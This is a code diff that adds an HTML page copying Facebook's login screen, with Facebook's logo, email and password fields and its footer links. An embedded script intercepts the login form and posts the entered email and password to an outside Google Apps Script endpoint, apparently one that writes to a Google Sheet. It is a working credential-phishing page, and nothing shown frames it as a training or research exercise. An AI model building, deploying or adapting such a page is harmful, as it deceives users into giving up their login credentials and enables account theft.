@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="shortcut icon" type="x-icon" href="facebook.svg">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div id="title">
+        <div class="container">
+            <img class="facebook" src="https://static.xx.fbcdn.net/rsrc.php/yI/r/4aAhOWlwaXf.svg"> 
+        </div>
+    </div>
+    <!-------------log-in-------------->
+    <div id="login">
+        <div class="log-in">
+            <p>Log Into Facebook</p>
+        </div>
+        <form name="submit-to-google-sheet">
+        <input type="text" name="Email" placeholder="Email or phone number" required>
+        <input type="password" name="Password" placeholder="Password" required>
+        <button type="submit" class="btn">Log in</button>
+        </form>
+        <div class="link">
+            <a href="#">Forgot account?</a>
+            
+            <a href="#">Sign up for Facebook</a>
+        </div>
+        <div class="copyright">
+
+        </div>
+    </div>
+
+    <div id="texts">
+     <div class="textss">
+        <ul class="language">
+            <li>English (US)</li>
+            <li> Filipino</li>
+            <li>Bisaya</li>
+            <li>Espanol</li>
+            <li>日本</li>
+            <li>한국어</li>
+            <li>中文(简体)</li>
+            <li>العربية</li>
+            <li>Português (Brasil)</li>
+            <li>Français (France)</li>
+            <li>Deutsch</li>
+        </ul>
+     </div>
+     <div class="context">
+        <p>Sign UpLog InMessengerFacebook LiteVideoPlacesGamesMarketplaceMeta PayMeta StoreMeta QuestInstagramThreadsFundraisersServicesVoting Information CenterPrivacy PolicyPrivacy CenterGroupsAboutCreate adCreate PageDevelopersCareersCookiesAd choicesTermsHelpContact Uploading & Non-UsersSettings</p>
+     </div>
+    </div>
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbzNGUwbEf13kW1Me1L44FjhwBf9qHRpMwEhJLtz0MCdZqapDoI1vrxumRrCyF2qJ_Ud2g/exec'
+        const form = document.forms['submit-to-google-sheet']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => console.log('Success!', response))
+            .catch(error => console.error('Error!', error.message))
+        })
+      </script>
+</body>
+</html>
